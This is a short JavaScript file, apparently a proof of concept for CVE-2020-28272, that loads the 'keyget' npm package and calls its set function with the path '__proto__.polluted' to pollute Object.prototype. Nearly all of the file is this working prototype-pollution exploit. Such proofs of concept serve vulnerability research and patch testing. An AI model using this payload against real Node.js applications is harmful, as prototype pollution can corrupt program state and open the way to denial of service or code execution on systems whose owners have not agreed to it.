//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28272
 
  var keyget = require("keyget");
  var obj = {};

   

  keyget.set({}, "__proto__.polluted", "yes");
// End of file
